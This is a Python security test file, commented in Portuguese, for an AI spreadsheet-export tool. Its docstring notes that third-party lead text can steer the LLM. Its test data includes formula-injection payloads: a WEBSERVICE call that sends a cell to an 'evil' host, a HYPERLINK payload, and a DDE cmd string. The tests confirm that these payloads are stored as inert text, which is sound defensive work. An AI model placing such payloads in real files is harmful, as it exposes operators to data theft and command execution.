# -*- coding: utf-8 -*-
"""
SEC-XLSX-01 — planilha gerada pela IA não pode sair com fórmula viva.

`generate_excel_document` (app/services/ai_tools.py) grava nas células o texto
que o LLM manda, e o LLM pode ser conduzido por texto de lead escrito por
terceiros (WhatsApp/n8n). O openpyxl marca toda string que começa com "=" como
fórmula (data_type "f"), então um `=HYPERLINK(...)` ou `=WEBSERVICE(...)` virava
fórmula no .xlsx que o operador baixa em /api/ai/download/.

Prova, chamando a ferramenta real e relendo o arquivo com openpyxl, que toda
célula — cabeçalho e dado — fica TEXTO (data_type "s") com exatamente o texto
enviado. Diferente do CSV (SEC-CSV-01), XLSX tem tipo de célula: não há prefixo
`'` nem exceção para telefone.

Sem rede, sem Gemini, sem banco real (SQLite descartável em scratch/ só para
satisfazer os imports — nenhuma query é executada). O .xlsx é gravado num
tempfile.TemporaryDirectory, passando pelo `_safe_document_target` de verdade.

Rodar:  python tests/test_ai_excel_formula.py
"""
import json
import os
import pathlib
import sys
import tempfile

# raiz do repo no sys.path (permite `python tests/test_ai_excel_formula.py`)
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

# Ambiente DEVE ser definido ANTES de importar app.* (mesmo padrão de
# test_perpetua_pdf_generation.py). O banco nunca é consultado por estes testes.
pathlib.Path("scratch").mkdir(exist_ok=True)
os.environ.update({
    "ENVIRONMENT": "development",
    "DATABASE_URL": "sqlite:///./scratch/ai_excel_formula_test.db",
    "SEED_INITIAL_ADMIN": "false",
    "GEMINI_API_KEY": "",
})

import openpyxl  # noqa: E402

from app.services import ai_tools  # noqa: E402


def _gerar_e_reler(headers, rows):
    """Chama a ferramenta real com UPLOAD_DIR num tempdir isolado e relê o .xlsx.

    Devolve a aba como matriz de (valor, data_type); a linha 0 é o cabeçalho.
    """
    with tempfile.TemporaryDirectory(prefix="ai_excel_formula_test_") as tmpdir:
        old_upload_dir = ai_tools.UPLOAD_DIR
        ai_tools.UPLOAD_DIR = tmpdir
        try:
            raw = ai_tools.generate_excel_document(
                filename="planilha_teste", sheet_name="Leads", headers=headers, rows=rows
            )
        finally:
            ai_tools.UPLOAD_DIR = old_upload_dir
        payload = json.loads(raw)
        assert payload.get("success") is True, f"esperava sucesso, veio: {payload}"
        wb = openpyxl.load_workbook(os.path.join(tmpdir, payload["filename"]))
        try:
            return [[(c.value, c.data_type) for c in linha] for linha in wb.active.iter_rows()]
        finally:
            wb.close()


def _assert_texto_literal(headers, rows, esperado):
    """Toda célula esperada tem de ser texto ("s") com o valor exato enviado."""
    planilha = _gerar_e_reler(headers, rows)
    divergentes = []
    for r, linha_esperada in enumerate(esperado):
        for c, texto in enumerate(linha_esperada):
            valor, tipo = planilha[r][c]
            if tipo != "s" or valor != texto:
                divergentes.append(
                    f"linha {r + 1} col {c + 1}: {valor!r} tipo={tipo!r} "
                    f"(esperado {texto!r} como texto)"
                )
    assert not divergentes, "células fora do esperado:\n    " + "\n    ".join(divergentes)


# ── 1. Célula hostil fica texto literal ─────────────────────────────────────

def test_dado_hostil_fica_texto_literal():
    """`=...` em célula de dado virava fórmula; `@`/`+` já saíam texto e seguem assim."""
    # '|' é o separador de colunas da ferramenta: o DDE clássico
    # `+cmd|' /C calc'!A0` chega, por construção, partido em duas células.
    _assert_texto_literal(
        headers="A|B|C|D|E",
        rows='=HYPERLINK("http://evil","x")|=1+1|@SUM(1)|+cmd|\' /C calc\'!A0',
        esperado=[
            ["A", "B", "C", "D", "E"],
            ['=HYPERLINK("http://evil","x")', "=1+1", "@SUM(1)", "+cmd", "' /C calc'!A0"],
        ],
    )


def test_cabecalho_hostil_fica_texto_literal():
    """O cabeçalho também vem do LLM e passa pelo mesmo `ws.cell(value=...)`."""
    _assert_texto_literal(
        headers='Nome|=WEBSERVICE("http://evil/?q="&A2)|=1+1',
        rows="Fulano|x|y",
        esperado=[
            ["Nome", '=WEBSERVICE("http://evil/?q="&A2)', "=1+1"],
            ["Fulano", "x", "y"],
        ],
    )


# ── 2. Valor comum continua idêntico (sem prefixo, sem escape) ──────────────

def test_dado_comum_fica_identico():
    """Telefone com `+`, número e negativo saem exatamente como enviados: XLSX
    não precisa do prefixo `'` do CSV, e o WhatsApp não pode ser alterado."""
    _assert_texto_literal(
        headers="Nome|WhatsApp|Valor|Saldo",
        rows="Fulano|+55 11 98765-4322|1500|-3,5;;Beltrana|+56 9 1234 5678|0|2.5",
        esperado=[
            ["Nome", "WhatsApp", "Valor", "Saldo"],
            ["Fulano", "+55 11 98765-4322", "1500", "-3,5"],
            ["Beltrana", "+56 9 1234 5678", "0", "2.5"],
        ],
    )


ALL_TESTS = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]

if __name__ == "__main__":
    failures = 0
    for fn in ALL_TESTS:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
        except AssertionError as exc:
            failures += 1
            print(f"FAIL  {fn.__name__}: {exc}")
        except Exception as exc:  # exceção inesperada = bug
            failures += 1
            print(f"ERROR {fn.__name__}: {type(exc).__name__}: {exc}")
    print(f"\n{len(ALL_TESTS) - failures}/{len(ALL_TESTS)} testes OK")
    sys.exit(1 if failures else 0)
